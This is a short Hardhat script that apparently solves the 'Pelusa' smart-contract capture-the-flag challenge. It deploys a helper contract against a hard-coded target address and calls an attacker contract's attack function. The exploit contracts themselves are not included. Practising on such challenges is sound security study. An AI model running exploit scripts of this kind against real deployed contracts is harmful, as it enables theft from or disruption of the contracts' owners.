import { ethers } from "hardhat";

const contractAddress = "0x644e8706AC9bB2bE3ad944A6db28268258efD485";

async function main() {
  const [attacker] = await ethers.getSigners();

  const deployer = "0xaa758e00eca745cab9232b207874999f55481951";

  const pelusaDeployer = await (await ethers.getContractFactory("PelusaDeployer", attacker)).deploy(contractAddress);
  await pelusaDeployer.deployed();

  const attackerContractAddress = await pelusaDeployer.attacker();
  const attackerContract = (await ethers.getContractFactory("ChallengePelusaAttacker")).attach(attackerContractAddress);

  const tx = await attackerContract.attack(deployer);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
